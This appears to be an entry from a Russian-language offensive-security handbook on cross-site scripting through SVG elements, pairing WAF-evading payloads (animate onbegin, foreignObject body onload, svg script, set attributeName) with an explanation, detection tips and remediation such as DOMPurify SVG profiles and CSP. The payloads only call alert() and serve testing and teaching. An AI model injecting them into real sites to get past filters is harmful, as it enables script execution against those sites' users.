---
id: xss-svg-onload-namespace
title: "XSS: SVG-векторы и вложенные namespace"
type: xss
target: html
category: web
difficulty: intermediate
bypass: waf
tags: [xss, svg, waf-bypass]
tested_on: ["Chrome 120"]
success_rate: 0.7
risk: medium
cwe: "CWE-79"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/xss/"
  - "https://portswigger.net/web-security/cross-site-scripting"
graph:
  - target: "xss"
    type: instance_of
  - target: "waf-bypass"
    type: technique_of
---

# XSS: SVG-векторы и вложенные namespace

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
```

## Explanation

SVG — полноценный XML-namespace внутри HTML со своими исполняемыми элементами:
`animate`, `set`, `foreignObject`, `script`. Санитайзеры, ориентированные на HTML-теги,
часто пропускают SVG-события (`onbegin`, `onend`, `onrepeat`).
`foreignObject` позволяет вложить произвольный HTML внутрь SVG.

## Detection

Проверьте, разрешён ли SVG в загружаемом/отражаемом контенте.
Сигнатуры WAF редко покрывают `animate onbegin`.

## Remediation

- Санитизация с поддержкой SVG-namespace (DOMPurify `USE_PROFILES: {svg: true}`).
- Пользовательские изображения отдавать как данные: `Content-Disposition: attachment`
  либо конвертация в растр.
- CSP: `object-src 'none'`, `script-src 'self'`.

## Variants

```
<svg><script>alert(1)</script></svg>
```

```
<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
```

```
<svg><set attributeName=onmouseover to=alert(1)>
```
